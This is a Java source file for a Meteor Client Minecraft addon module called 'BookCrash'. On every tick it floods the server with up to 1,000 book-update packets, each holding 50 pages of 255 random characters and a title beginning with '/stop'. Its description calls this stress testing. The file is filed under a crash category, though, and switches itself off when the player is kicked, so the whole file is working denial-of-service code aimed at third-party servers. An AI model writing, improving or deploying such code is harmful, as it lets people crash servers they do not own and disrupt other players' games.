package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;

import java.util.ArrayList;
import java.util.Optional;
import java.util.Random;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(100).min(1).sliderMax(1000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public BookCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "book-crash",
            "Spams oversized book sign packets to stress server book processing.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        for (int i = 0; i < amount.get(); i++) sendBadBook();
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String page  = randomAlphanumeric(255);
        ArrayList<String> pages = new ArrayList<>();
        for (int i = 0; i < 50; i++) pages.add(page);
        mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(
            mc.player.getInventory().getSelectedSlot(), pages, Optional.of(title)));
    }

    private static final Random RAND = new Random();
    private static final String CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    private static String randomAlphanumeric(int len) {
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) sb.append(CHARS.charAt(RAND.nextInt(CHARS.length())));
        return sb.toString();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
